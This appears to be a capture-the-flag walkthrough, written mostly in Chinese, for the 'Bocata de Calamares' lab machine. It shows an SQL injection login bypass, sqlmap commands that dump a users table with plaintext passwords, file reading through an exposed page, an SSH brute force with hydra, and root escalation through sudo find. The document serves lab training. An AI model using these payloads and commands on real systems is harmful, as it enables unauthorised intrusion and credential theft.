# Bocata de Calamares

2025.02.25 https://thehackerslabs.com/bocata-de-calamares/

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问 web 首页，底部发现邮箱 indurandor@fkn.com 。发现 http://192.168.5.40/sqli.php 的一个页面，讲的是 sql 注入，可能暗示这个靶机存在 sql 注入。

目录扫描发现 /login.php 和 /admin.php 页面，首先看登陆页面，尝试 sql 注入，就按照 http://192.168.5.40/sqli.php 底部提示的注入方式进行输入，登陆成功：

```
Usuario: admin
Contraseña: ' OR '1'='1
```

使用 sqlmap 跑 form 中的密码字段，得出数据库信息：

```
sqlmap -u http://192.168.5.40/login.php --data='alias=admin&password=1*' --batch --dbs

[*] information_schema
[*] performance_schema
[*] php

sqlmap -u http://192.168.5.40/login.php --data='alias=admin&password=1*' --batch -D php --tables

sqlmap -u http://192.168.5.40/login.php --data='alias=admin&password=1*' --batch -D php -T usuarios --dump

+----+------------+---------------------+---------+--------------+
| id | alias      | email               | nombre  | contraseña   |
+----+------------+---------------------+---------+--------------+
| 1  | adminPrinc | admin@localhost.com | admin   | 123456       |
| 2  | Pep100     | pepe@email.com      | pepe    | qwertyuiop   |
| 3  | Jaime_P    | jaime@email.com     | jaime   | jaime        |
| 4  | Richard    | Ricardobc@gmail.com | Ricardo | qwertyu      |
+----+------------+---------------------+---------+--------------+
```

使用得到的用户名和密码爆破 ssh，但是都不对。

在看管理员页面中有一个代办事项页面 http://192.168.5.40/todo-list.php 里面有一项：

```
我创建了一个新页面，以便能够读取内部服务器文件，每天我都是更好的程序员。我也已经编码了基于名称的64，因此没人能找到它（Lee_archivos）。
```

对后面的单词进行 base64，要带换行符，否则 base64 后是 bGVlX2FyY2hpdm9z 页面爆 404：

```
echo lee_archivos|base64
bGVlX2FyY2hpdm9zCg==
```

访问文件：http://192.168.5.40/bGVlX2FyY2hpdm9zCg==.php 弹出读取文件的页面，读取 /etc/passwd 发现：

```
root:x:0:0:root:/root:/bin/bash
tyuiop:x:1000:1000:tyuiop:/home/tyuiop:/bin/bash
superadministrator:x:1001:1001:,,,:/home/superadministrator:/bin/bash
```

同时在源代码处得到提示：

```
<!-- Tengo que limitar los archivos que se pueden ver, al menos hasta que los usuarios tengan unas contraseñas más robustas -->
<!-- Si alguien leyera el archivo donde se encuentran los usuarios y usara la herramienta hydra para atacar nuestro servicio ssh... Bueno, mañana me encargare de ello -->
```

提示 hydra 进行 ssh 爆破，使用 rockyou 对这 2 个用户名进行爆破，得到了 superadministrator 的登陆密码 princesa 进行登陆。

先拿到 flag:

```
superadministrator@thehackerslabs-bocatacalamares:~$ cat flag.txt
c3VkbyAtbAo=
```

解码后是 sudo -l , 执行后发现 (ALL) NOPASSWD: /usr/bin/find 可以直接拿到 root 权限：

```
sudo find . -exec /bin/sh \; -quit

# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
S0Y_UN_h4K3R
```
